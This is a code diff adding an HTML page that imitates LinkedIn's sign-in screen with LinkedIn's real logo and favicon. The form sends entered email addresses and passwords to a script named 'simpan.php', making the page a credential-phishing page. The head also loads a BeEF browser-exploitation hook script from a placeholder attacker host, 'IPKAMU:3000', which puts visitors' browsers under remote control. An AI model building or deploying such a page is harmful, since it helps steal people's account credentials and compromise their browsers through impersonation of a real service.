@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>LinkedIn Login</title>
+  <link rel="icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico" type="image/x-icon">
+  <style>
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f3f2ef;
+      margin: 0;
+      padding: 0;
+    }
+    .header {
+      background-color: #ffffff;
+      padding: 10px 20px;
+      box-shadow: 0 1px 5px rgba(0,0,0,0.1);
+    }
+    .header img {
+      height: 35px;
+    }
+    .login-container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 30px;
+      background-color: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #0a66c2;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .footer {
+      text-align: center;
+      color: gray;
+      font-size: 12px;
+      margin-top: 30px;
+    }
+  </style>
+
+  <!-- BeEF hook -->
+  <script src="http://IPKAMU:3000/hook.js"></script>
+
+</head>
+<body>
+
+<div class="header">
+  <img src="https://static.licdn.com/scds/common/u/images/logos/linkedin/logo_linkedin_92x22.png" alt="LinkedIn">
+</div>
+
+<div class="login-container">
+  <h2>Sign in</h2>
+  <form action="simpan.php" method="POST">
+    <input type="text" name="email" placeholder="Email or Phone" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Sign in</button>
+  </form>
+</div>
+
+<div class="footer">
+  LinkedIn Corporation © 2025
+</div>
+
+</body>
+</html>
